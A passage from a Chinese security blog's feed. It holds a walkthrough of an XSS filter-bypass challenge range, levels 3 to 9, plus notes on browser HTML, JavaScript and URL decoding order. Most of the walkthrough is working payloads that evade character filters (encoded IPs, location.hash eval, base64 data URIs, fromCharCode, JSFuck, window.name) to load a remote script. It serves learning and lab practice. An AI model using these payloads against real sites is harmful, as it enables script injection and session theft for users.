class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://2886795265:9990/evil&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//十进制IP</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://025404200001:9990/evil&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//十六进制IP</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span> <span class="attr">src</span>=<span class="string">&quot;http://[::1]:9990/evil&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span> <span class="comment">//IPv6</span></span><br><span class="line"></span><br><span class="line"><span class="comment">//从url获取 . 也是脑洞大开，2333，但是我在测试的时候，这里的格式化字符串老是多一个逗号，可能是浏览器解析的问题，因为格式化字符串也是刚出的标准</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> dot=location[<span class="string">&quot;href&quot;</span>][<span class="number">10</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> url=<span class="string">`http://xcao<span class="subst">$&#123;dot&#125;</span>vip/xss/alert<span class="subst">$&#123;dot&#125;</span>js`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>[<span class="string">&#x27;write&#x27;</span>]<span class="string">`&lt;script type=&quot;text/javascript&quot; src=<span class="subst">$&#123;url&#125;</span>&gt;</span></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span>`;</span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">///通过思考，提前拼接JS，可以规避逗号问题，这个脑洞打开的方法运行成功，payload如下，这里在结尾多加了一个&lt;/script&gt;才成功，深层原理还没搞懂，以及反引号拼接并不顺利，待补充</span></span><br><span class="line">a=<span class="language-xml"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> dot=location[<span class="string">&quot;href&quot;</span>][<span class="number">12</span>];</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> url=<span class="string">`https://xcao<span class="subst">$&#123;dot&#125;</span>vip/test/alert<span class="subst">$&#123;dot&#125;</span>js`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="keyword">var</span> test=<span class="string">`&lt;script type=text/javascript src=<span class="subst">$&#123;url&#125;</span>&gt;`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"><span class="variable language_">document</span>[<span class="string">&#x27;write&#x27;</span>]<span class="string">`<span class="subst">$&#123;test&#125;</span>`</span>;</span></span></span><br><span class="line"><span class="language-javascript"><span class="language-xml"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br><span class="line"><span class="language-xml"><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span></span><br></pre></td></tr></table></figure><p>类似的还有从锚点里面截取点 <code>.</code> 的，这里不做实验，原理和从url获取一样，只需知道<code>dian=location[&#39;hash&#39;][1];</code>可以获取锚点</p><p>补充</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">跳转到IP后的index.php</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: http://xcao.vip/xss/alert.js&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="参考：-1"><a href="#参考：-1" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://www.lzskyline.com/index.php/archives/105/">独孤九剑-xss绕过闯关游戏</a><br><a href="https://www.letianbiji.com/web-front-end/js-string-format.html">JavaScript: 如何使用 format 格式化字符串</a></p><h2 id="第四式"><a href="#第四式" class="headerlink" title="第四式"></a>第四式</h2><h3 id="方法-1"><a href="#方法-1" class="headerlink" title="方法 1"></a>方法 1</h3><p>过滤了 <code>= () . &amp; # \ </code><br>等于号被过滤就不好搞了，想想还是使用锚点替换，同时考虑特殊字符很多被过滤，就想到使用url二次编码，然后就要出发二次编码，然后在上篇的XSS初探可以看到URL解析JS协议，<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;&lt;/a&gt;</code>，所以我们就想到JS里有需要加载页面的函数，这样就可以出发URL二次编码，同时加载攻击页面。<br>我们知道<code>location.assign(&quot;https://www.w3schools.com&quot;)</code>可以加载一个页面， 我们可以魔改成<code>location.assign(&quot;javascript:JScode&quot;)</code>，但是还是有点<code>.</code>，再魔改<code>location[&#39;assign&#39;](&quot;javascript:JScode&quot;)</code>，这就基本成功了，一下为最终payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line">location[<span class="string">&#x27;replace&#x27;</span>]<span class="string">`javascript:eval(eval(location.hash.slice(1)))`</span>&lt;<span class="regexp">/script&gt;#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https:/</span><span class="regexp">/t.xcao.vip/</span>xss/alert.<span class="property">js</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">再二次编码URL</span></span><br><span class="line"><span class="string">&lt;script&gt;location%5B&#x27;</span>replace<span class="string">&#x27;%5D%60javascript%3Aeval%2528eval%2528location%252Ehash%252Eslice%25281%2529%2529%2529%60&lt;/script&gt;#with(document)body.appendChild(createElement(&#x27;</span>script<span class="string">&#x27;)).src=&#x27;</span><span class="attr">https</span>:<span class="comment">//t.xcao.vip/xss/alert.js&#x27;</span></span><br></pre></td></tr></table></figure><p>可以把assign改成replace也可以，总之能够出发二次url编码就可以</p><h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法 2"></a>方法 2</h3><p>使用<code>&lt;iframe&gt;</code>，再页面内开一个框架<br>和法一类似，也是构造引用，然后转码绕过，其中的伪协议<code>data:</code>，是否可以可以换成<code>javascirpt</code>，应该是可以的，已验证其中replace可以换成assign。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://t.xcao.vip/test/xss4.php?data=<span class="string">&quot;&gt;&lt;iframe&gt;&lt;/iframe&gt;&lt;script&gt;frames[0][&#x27;location&#x27;][&#x27;replace&#x27;]`data:text/html;base64,PHNjcmlwdCBzcmM9J2h0dHBzOi8vdC54Y2FvLnZpcC94c3MvYWxlcnQuanMnPjwvc2NyaXB0Pg==`&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><p>方法二参照 <a href="https://chowdera.com/2021/09/20210909135430110i.html">独孤九剑之XSS修炼</a></p><h2 id="第五关"><a href="#第五关" class="headerlink" title="第五关"></a>第五关</h2><p>过滤了<code>().&amp;#\% </code>   </p><h3 id="方法-1-1"><a href="#方法-1-1" class="headerlink" title="方法 1"></a>方法 1</h3><p>我们正常跳转就只用到点<code>.</code>，所以这里用到IP转换即可，一下为payload</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script src=&#x27;http://2130706433/a/&#x27;&gt;&lt;/script&gt;</span></span><br></pre></td></tr></table></figure><h3 id="方法-2-1"><a href="#方法-2-1" class="headerlink" title="方法 2"></a>方法 2</h3><p>同第四关 <code>&lt;iframe&gt;</code></p><h2 id="第六关"><a href="#第六关" class="headerlink" title="第六关"></a>第六关</h2><h3 id="法-1"><a href="#法-1" class="headerlink" title="法 1"></a>法 1</h3><p>同第四关 <code>&lt;iframe&gt;</code></p><h3 id="法-2"><a href="#法-2" class="headerlink" title="法 2"></a>法 2</h3><p>靶场作者的方法，作者非常喜欢用锚点替换，我们分析看看</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&quot;&gt;&lt;script&gt;document[&#x27;write&#x27;]`&lt;img $&#123;location[&#x27;hash&#x27;][&#x27;slice&#x27;]`1`&#125;`&lt;/script&gt;#/src=&#x27;x&#x27;onerror=with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/test/alert.js&#x27;//</span></span><br></pre></td></tr></table></figure><p>作者的思路是写一个<code>&lt;img &gt;</code>，然后触发<code>onerror</code>，也是脑洞大开，666<br>我们之前遇到过用<code>$&#123;&#125;</code>格式化字符串的时候，会有逗号<code> ,</code>在前面，在这里也导致了同样的问题，逗号会导致语法问题，作者用 <code>/</code>解决了，不明白原理。。。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">img</span> ,=<span class="string">&quot;&quot;</span> <span class="attr">src</span>=<span class="string">&quot;x&quot;</span> <span class="attr">onerror</span>=<span class="string">&quot;with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https://t.xcao.vip/xss/alert.js&#x27;//<span class="symbol">&amp;quot;</span>&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="法-3"><a href="#法-3" class="headerlink" title="法 3"></a>法 3</h3><p>利用<code>document[&#39;write&#39;]`$&#123;String[&#39;fromCharCode&#39;]`61`&#125;`;</code><br>其中<code>String.fromCharCode(61)</code>是等于号，理论上可以利用，但是一直不成功，待补。<br>这里经过第七关的测试，发现在<code>$&#123;&#125;</code>里可以随意拼接,所以得</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe&gt;版</span><br><span class="line">https://t.xcao.vip/test/xss6.php?data=<span class="string">&quot;&gt;&lt;script&gt;document[&#x27;write&#x27;]`$&#123;&quot;</span>&lt;iframe src<span class="string">&quot;%2BString[&#x27;fromCharCode&#x27;]`61`%2B&quot;</span>data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vdC54Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg==&gt;<span class="string">&quot;&#125;`&lt;/script&gt;</span></span><br><span class="line"><span class="string">纯&lt;script&gt;,通过测试 $&#123;&quot;</span>string<span class="string">&quot;%2BString[&#x27;fromCharCode&#x27;]`61`%2B&quot;</span>string<span class="string">&quot;&#125;可以构造任意字符串  (其中url(&#x27;+&#x27;)=%2B)</span></span><br><span class="line"><span class="string">https://t.xcao.vip/test/xss6.php?data=&quot;</span>&gt;&lt;script&gt;document[<span class="string">&#x27;write&#x27;</span>]`$&#123;<span class="string">&quot;&lt;script src&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">61</span>`%2<span class="string">B&quot;https://t&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">46</span>`%2<span class="string">B&quot;xcao&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">46</span>`%2<span class="string">B&quot;vip/xss/alert&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">46</span>`%2<span class="string">B&quot;js&gt;&quot;</span>%2BString[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">60</span>`%2<span class="string">B&quot;/script&gt;&quot;</span>&#125;`&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/fromCharCode">String.fromCharCode文档</a></p><h2 id="第七关"><a href="#第七关" class="headerlink" title="第七关"></a>第七关</h2><p>这里基本是我的知识盲区了，嘿嘿。</p><h3 id="法-1-1"><a href="#法-1-1" class="headerlink" title="法 1"></a>法 1</h3><p>看了大佬的<code>JSFuck</code>方法（名字起的好黄好暴力~）</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="literal">false</span> =&gt; ![]</span><br><span class="line"><span class="literal">true</span> =&gt; !![]</span><br><span class="line"><span class="literal">undefined</span> =&gt; [][[]]</span><br><span class="line"><span class="title class_">NaN</span> =&gt; +[![]]</span><br><span class="line"><span class="number">0</span> =&gt; +[]</span><br><span class="line"><span class="number">1</span> =&gt; +!+[]</span><br><span class="line"><span class="number">2</span> =&gt; !+[]+!+[]</span><br><span class="line"><span class="number">10</span> =&gt; [+!+[]]+[+[]]</span><br><span class="line"><span class="title class_">Array</span> =&gt; []</span><br><span class="line"><span class="title class_">Number</span> =&gt; +[]</span><br><span class="line"><span class="title class_">String</span> =&gt; []+[]</span><br><span class="line"><span class="title class_">Boolean</span> =&gt; ![]</span><br><span class="line"><span class="title class_">Function</span> =&gt;[][“filter”]</span><br><span class="line"><span class="built_in">eval</span> =&gt; [][<span class="string">&quot;filter&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="variable constant_">CODE</span>)()</span><br><span class="line"><span class="variable language_">window</span> =&gt; [][<span class="string">&quot;filter&quot;</span>][<span class="string">&quot;constructor&quot;</span>](<span class="string">&quot;return this&quot;</span>)()</span><br></pre></td></tr></table></figure><p>这里就可以构造payload了，把左右括号换成<code>反引号</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">构造</span><br><span class="line">https://t.xcao.vip/test/xss7.php?data=<span class="number">1</span>;[][<span class="string">&#x27;constructor&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>](a$&#123;location[<span class="string">&#x27;hash&#x27;</span>][<span class="string">&#x27;slice&#x27;</span>]`<span class="number">1</span>`&#125;)()<span class="comment">#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https://t.xcao.vip/xss/alert.js&#x27;</span></span><br><span class="line">再把左右括号换成 反引号 `</span><br><span class="line">https://t.xcao.vip/test/xss7.php?data=<span class="number">1</span>;[][<span class="string">&#x27;constructor&#x27;</span>][<span class="string">&#x27;constructor&#x27;</span>]`a$&#123;location[<span class="string">&#x27;hash&#x27;</span>][<span class="string">&#x27;slice&#x27;</span>]`<span class="number">1</span>`&#125;```<span class="comment">#with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;https://t.xcao.vip/xss/alert.js&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="法-2-1"><a href="#法-2-1" class="headerlink" title="法 2"></a>法 2</h3><p>使用<code>String.fromCharCode</code>，前面说过该函数可以为我们构造字符，在第六关没有成功，在这里是一下。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://t.xcao.vip/test/xss7.php?data=<span class="string">&quot;&quot;</span>;document[<span class="string">&#x27;write&#x27;</span>]`$&#123;String[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">60</span>`+<span class="string">&quot;iframe src&quot;</span>+String[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">61</span>`+<span class="string">&quot;data:text/html;base64,PHNjcmlwdCBzcmM9Imh0dHBzOi8vdC54Y2FvLnZpcC94c3MvYWxlcnQuanMiPjwvc2NyaXB0Pg==&quot;</span>+String[<span class="string">&#x27;fromCharCode&#x27;</span>]`<span class="number">62</span>`&#125;`</span><br></pre></td></tr></table></figure><p>不知道这里加一个<code>$&#123;&#125;</code>就可以正常拼接了，很奇怪</p><h2 id="第八关"><a href="#第八关" class="headerlink" title="第八关"></a>第八关</h2><h3 id="法-1-2"><a href="#法-1-2" class="headerlink" title="法 1"></a>法 1</h3><p>自己建一个<code>&lt;iframe&gt;</code>网页，然后利用匿名函数，payload如下 </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=<span class="string">&quot;http://xcao.vip/test/xss8.php/?data=Function`b$&#123;name&#125;```&quot;</span> name=<span class="string">&quot;with(document)body.appendChild(createElement(&#x27;script&#x27;)).src=&#x27;http://xcao.vip/xss/alert.js&#x27;&quot;</span>&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://www.w3cschool.cn/xqw2e7/u7z512vt.html">JavaScript匿名函数的理解</a></p><h3 id="法-2-2"><a href="#法-2-2" class="headerlink" title="法 2"></a>法 2</h3><p>和法1类似，不过更牛X，利用匿名函数，调用atob函数，方法用于解码使用 base-64 编码的字符串</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xcao.vip/test/xss8.php?data=Function`b$&#123;atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPSdodHRwOi8veGNhby52aXAveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`&#125;```</span><br></pre></td></tr></table></figure><p>参考：<br><a href="https://chowdera.com/2021/09/20210909135430110i.html">https://chowdera.com/2021/09/20210909135430110i.html</a></p><h2 id="第8-1关"><a href="#第8-1关" class="headerlink" title="第8-1关"></a>第8-1关</h2><p>过滤了<code>=().&amp;#\%&lt;&gt;&#39;&quot;&#123;&#125;</code>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://xcao.vip/test/xss8-<span class="number">1.</span>php?data=atob`ZG9jdW1lbnQud3JpdGUoIjxzY3JpcHQgc3JjPScveHNzL2FsZXJ0LmpzJz48L3NjcmlwdD4iKQ`;location[`replace`]`javascript:a`</span><br></pre></td></tr></table></figure><p>这个思路很牛X，利用伪协议加载a变量，而a是我们构造的JS代码</p><h2 id="第8-2关"><a href="#第8-2关" class="headerlink" title="第8-2关"></a>第8-2关</h2><p>过滤了<code> =().&amp;#\%&lt;&gt;&#39;&quot;[] Function</code><br>这里直接放作者的答案了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">基本格式</span><br><span class="line"><span class="built_in">open</span>(<span class="string">&quot;javascript:name&quot;</span>, <span class="string">&quot;WindowName&quot;</span>）</span><br><span class="line"></span><br><span class="line">经改编</span><br><span class="line">http://xcao.vip//test/xss8-<span class="number">2.</span>php?data=<span class="built_in">open</span>`javascript:name//$&#123;atob`PGltZyBzcmM9eCBvbmVycm9yPXdpdGgob3BlbmVyLmRvY3VtZW50KWJvZHkuYXBwZW5kQ2hpbGQoY3JlYXRlRWxlbWVudCgnc2NyaXB0JykpLnNyYz0naHR0cDovL3hjYW8udmlwL3hzcy9hbGVydC5qcyc%2b`&#125;`</span><br></pre></td></tr></table></figure><p>这里用到了open方法，意思就是可以新开一个窗口格式为</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">window</span>.<span class="title function_">open</span>(strUrl, strWindowName, [strWindowFeatures]);</span><br></pre></td></tr></table></figure><p>这里的name是JS的一个内置变量，经测试，值为窗口名称。所以也就是open的第二个参数，也就是我们可以在第二个参数里面加入我们的攻击代码，为了绕开过滤，我们利用atob进行base64加密。<br>这里为什么要加<code>//</code>呢？我们在之前测试过直接<code>$&#123;&#125;</code>取值的话，我们莫名多一个逗号<code>,</code>，这就会导致转嘀的参数发生变化，至于为什么加两个斜杠就可以了，我也不知道，嘿嘿。。</p><h2 id="第九关"><a href="#第九关" class="headerlink" title="第九关"></a>第九关</h2><p>过滤了<code>().&amp;#\%&lt;&gt;&quot;$[]&#123;&#125;;,/`</code>，基本没啥可用的了</p><p>所以作者用了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://xcao.vip//test/xss913415426262.php?data=location=name</span><br></pre></td></tr></table></figure><p>这里的name就是我们说的JS的内置变量，在这里为空，传到后端就是</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;</span><br><span class="line"><span class="keyword">var</span> a=location=name;<span class="comment">//即var a=location=&#x27; &#x27;</span></span><br><span class="line">&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>经测试location&#x3D;’’,就会原地跳转，很奇怪，原理待补。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>主要是利用url二次编码、锚点替换、JSfuck、跳转方法</p><h3 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h3><p><a href="https://a2u13.com/2020/07/03/XSS%E4%BF%AE%E7%82%BC%E4%B9%8B%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91/">XSS修炼之独孤九剑</a><br><a href="https://chowdera.com/2021/09/20210909135430110i.html">[XSS] Dugu Jiujian of XSS cultivation</a><br><a href="https://xcao.vip/test/xss%E4%BF%AE%E7%82%BC%E4%B9%8B%E7%8B%AC%E5%AD%A4%E4%B9%9D%E5%89%91.pdf">xss修炼之独孤九剑.pdf  </a><br><a href="https://ucasers.cn/XSS%E8%BF%9B%E9%98%B6%E7%AC%94%E8%AE%B0/#">XSS进阶笔记</a><br><a href="http://www.ab126.com/system/2859.html">IP地址转换到十六进制,十进制,二进制地址</a><br><a href="https://www.qqxiuzi.cn/bianma/zifushiti.php">HTML字符实体转换</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS 初探笔记</title>
      <link href="/2022/03/17/XSS-%E5%88%9D%E6%8E%A2%E7%AC%94%E8%AE%B0/"/>
      <url>/2022/03/17/XSS-%E5%88%9D%E6%8E%A2%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="浏览器解码规则总结"><a href="#浏览器解码规则总结" class="headerlink" title="浏览器解码规则总结"></a>浏览器解码规则总结</h2><p>解析顺序：</p><ol><li>html解析器对html文档进行解析，完成 html解码 并且创建DOM树  </li><li>JavaScript 或者CSS解析器对内联脚本进行解析，完成JS、CSS解码  </li><li>url解码会根据url所在的顺序不同而在JS解码前或者解码后</li></ol><p>无论哪种解析，这里的核心逻辑是，编码的目的是让被占用的字符能够被使用，例如&lt;&gt; img ()等，当编码使用目的与此目的冲突时，解码输出就被当作纯纯字符串。</p><p>实现编码目的就要有具体的编码解码规则。</p><h3 id="html解析器"><a href="#html解析器" class="headerlink" title="html解析器"></a>html解析器</h3><p>html解析器以状态机的方式运行，举例：<code>&lt;p&gt;Hello&lt;/p&gt;</code><br>初始状态为Data state，当遇到&lt;时，状态转为Tag open，读取到a-z某个字符会创建开始标签，此时状态转为Tag name，直到读取到&gt;，状态又回到Data，接着读取到H会识别并生成一个字符，相应得会为Hello中的每个字符生成一个字符符号；之后遇到&lt;，又转为Tag open，读取到 “&#x2F;” 则创建一个闭合标签，并将状态变为Tag name，直到遇到&gt;后回到Data state</p><p>注意：HTML解析器处于Data Stata、RCDATA State、Attribute Value State时，字符实体会被解码为对应的字符，换句话说也就是这种state才会发挥编码的价值<br>例：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">div</span>&gt;</span><span class="symbol">&amp;#60;</span>img src=x onerror=alert(4)<span class="symbol">&amp;#62;</span><span class="tag">&lt;/<span class="name">div</span>&gt;</span></span><br></pre></td></tr></table></figure><p>读取到<code>&amp;#60;</code>时，还处于data状态，所以就把<code>&amp;#60;</code>解析成 &lt; ，而不是进入Tag open ，这也是我所说的核心逻辑，编码是为了正常使用特殊字符。</p><p>HTML中有五种元素：</p><blockquote><p><strong>空元素</strong>，如hr、img、input等，不能容纳任何内容，因为它们没有闭合标签。  </p><p><strong>原始文本元素</strong>，有<code>&lt;script&gt;</code>和<code>&lt;style&gt;</code>,可容纳文本，字符实体不被解码。</p><p><strong>RCDATA元素</strong>，有<code>&lt;textarea&gt;</code>和<code>&lt;title&gt;</code>，可容纳文本和字符引用，字符实体被解码，但无法执行js代码，很好理解，名字就叫文本区域。</p><p><strong>外来元素</strong>，来自MathML命名空间和SVG命名空间的元素，可容纳文本，字符引用，CDATA&gt;段，其他元素和注释，<code>&lt;svg&gt;</code>遵循XML和SVG的定义，可以暂且理解为先进行解码，在进行dom树的建立。</p><p><strong>常规元素</strong>，其他HTML允许的元素都称为常规元素，可容纳文本，字符引用，其他元素和注释。</p></blockquote><h3 id="JavaScript解析器"><a href="#JavaScript解析器" class="headerlink" title="JavaScript解析器"></a>JavaScript解析器</h3><ol><li>字符串部位，正常解析，很好理解，编码就是为了字符串使用特殊字符的。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="title function_">alert</span>(“\u0031”);&lt;/script&gt;</span><br><span class="line">被编码的为<span class="number">1</span>且是字符串，可以正常解码并触发执行</span><br></pre></td></tr></table></figure></li><li>标识符位置,正常解析，我理解为是为了更好嵌入html，所以把标识符也可解码且不影响标识功能。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;\u0061\u006c\u0065\u0072\<span class="title function_">u0074</span>(<span class="number">1</span>);&lt;/script&gt;</span><br><span class="line">被编码的部分为alert字符，是函数名，属于在标识符中的情况，因此会被正常解码并执行<span class="variable constant_">JS</span></span><br></pre></td></tr></table></figure></li><li>控制符位置，非正常解析，可以理解，控制符都被编码了，那不乱套了，会导致编码没有意义。<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;alert\u0028″xss”);&lt;/script&gt;</span><br><span class="line">\u0028会被解码为( 但是不会触发<span class="variable constant_">JS</span>，因为是控制符</span><br></pre></td></tr></table></figure><h3 id="URL解析器"><a href="#URL解析器" class="headerlink" title="URL解析器"></a>URL解析器</h3></li><li>协议部分，非正常解析，很好理解，符合原则。<br>协议部分必须为ASCII字符，否则URL解析器的状态机将进入No Scheme状态<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=<span class="string">&quot;%6a%61%76%61%73%63%72%69%70%74:alert(1)&quot;</span>&gt;&lt;/a&gt;</span><br><span class="line">url编码部分为javascript，因为作为协议部分的<span class="string">&quot;javascript&quot;</span>被编码，故不会触发<span class="variable constant_">JS</span></span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><code>:</code>，可以理解为JS的控制符<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;a href=&quot;javascript%3aalert(1)&quot;&gt;&lt;/a&gt;</span><br><span class="line">:被url编码为%3a，导致url状态机进入No Scheme状态，故不会触发JS</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="有趣的靶场："><a href="#有趣的靶场：" class="headerlink" title="有趣的靶场："></a>有趣的靶场：</h3><a href="https://xss.haozi.me/#/0x01">https://xss.haozi.me/#/0x01</a></li></ol><h3 id="参考："><a href="#参考：" class="headerlink" title="参考："></a>参考：</h3><p><a href="https://blog.csdn.net/baidu_38844729/article/details/109328472">浏览器解码规则详解</a><br><a href="http://weijin.ink/2021/04/07/%E6%B5%8F%E8%A7%88%E5%99%A8%E7%BC%96%E7%A0%81%E8%A7%A3%E7%A0%81/">浏览器编码解码</a><br><a href="https://blog.csdn.net/qq_41683305/article/details/114310529">web安全—浏览器解析提交数据的过程</a><br><a href="https://www.zhihu.com/question/21745144/answer/2331060457">在学习 XSS 前应该学习什么？ - w01ke的回答 - 知乎</a><br><a href="http://www.myhack58.com/Article/60/61/2015/59947_6.htm">深入理解浏览器解析机制和XSS向量编码</a><br><a href="https://www.hackersb.cn/hacker/85.html">SVG XSS的一个黑魔法</a><br><a href="https://ab-alex.github.io/2019/07/30/%E6%B5%8F%E8%A7%88%E5%99%A8%E8%A7%A3%E9%87%8A%E6%9C%BA%E5%88%B6%E5%92%8Csvg-xss/">浏览器解释机制和svg xss</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>struts2系列 远程代码执行漏洞 复现</title>
